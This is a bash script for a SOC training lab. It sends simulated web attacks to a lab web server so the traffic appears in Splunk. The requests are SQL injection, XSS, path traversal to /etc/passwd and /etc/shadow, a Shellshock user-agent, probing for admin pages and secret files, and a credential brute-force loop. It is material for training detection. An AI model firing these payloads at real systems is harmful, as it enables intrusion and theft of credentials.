#!/bin/bash

# Web Attack Simulation Script for SOC Lab
# This simulates various web-based attacks for training purposes

WEB_TARGET="http://webserver"
DELAY=2

echo "===== Web Attack Simulation Starting ====="
echo "Target: $WEB_TARGET"
echo ""

# Normal traffic
echo "[+] Generating normal traffic..."
for i in {1..5}; do
    curl -s "$WEB_TARGET/" > /dev/null
    sleep $DELAY
done

# SQL Injection attempts
echo "[+] Simulating SQL Injection attempts..."
curl -s "$WEB_TARGET/login?user=admin' OR '1'='1" > /dev/null
sleep $DELAY
curl -s "$WEB_TARGET/search?q='; DROP TABLE users--" > /dev/null
sleep $DELAY
curl -s "$WEB_TARGET/api/user?id=1 UNION SELECT * FROM passwords" > /dev/null
sleep $DELAY

# XSS attempts
echo "[+] Simulating XSS attempts..."
curl -s "$WEB_TARGET/search?q=<script>alert('XSS')</script>" > /dev/null
sleep $DELAY
curl -s "$WEB_TARGET/comment?text=<img src=x onerror=alert(1)>" > /dev/null
sleep $DELAY

# Path Traversal
echo "[+] Simulating Path Traversal attempts..."
curl -s "$WEB_TARGET/../../../../etc/passwd" > /dev/null
sleep $DELAY
curl -s "$WEB_TARGET/files?path=../../etc/shadow" > /dev/null
sleep $DELAY

# Admin panel probing
echo "[+] Simulating Admin Panel Probing..."
curl -s "$WEB_TARGET/admin" > /dev/null
curl -s "$WEB_TARGET/administrator" > /dev/null
curl -s "$WEB_TARGET/wp-admin" > /dev/null
curl -s "$WEB_TARGET/admin.php" > /dev/null
curl -s "$WEB_TARGET/phpmyadmin" > /dev/null
sleep $DELAY

# Suspicious User Agents
echo "[+] Simulating requests with suspicious user agents..."
curl -s -A "Nikto/2.1.6" "$WEB_TARGET/" > /dev/null
sleep $DELAY
curl -s -A "sqlmap/1.0" "$WEB_TARGET/api" > /dev/null
sleep $DELAY
curl -s -A "() { :; }; /bin/bash -c 'cat /etc/passwd'" "$WEB_TARGET/" > /dev/null
sleep $DELAY

# Brute force simulation
echo "[+] Simulating login brute force..."
for user in admin root administrator guest; do
    for pass in password 123456 admin root; do
        curl -s -X POST "$WEB_TARGET/login" -d "username=$user&password=$pass" > /dev/null
        sleep 0.5
    done
done

# Large payload (possible DoS)
echo "[+] Simulating large payload..."
curl -s -X POST "$WEB_TARGET/upload" -d "data=$(head -c 10000 < /dev/urandom | base64)" > /dev/null
sleep $DELAY

# Sensitive file access
echo "[+] Simulating sensitive file access attempts..."
curl -s "$WEB_TARGET/.env" > /dev/null
curl -s "$WEB_TARGET/.git/config" > /dev/null
curl -s "$WEB_TARGET/config.php" > /dev/null
curl -s "$WEB_TARGET/.htaccess" > /dev/null
curl -s "$WEB_TARGET/backup.sql" > /dev/null
sleep $DELAY

echo ""
echo "===== Attack Simulation Complete ====="
echo "Check Splunk for generated events!"
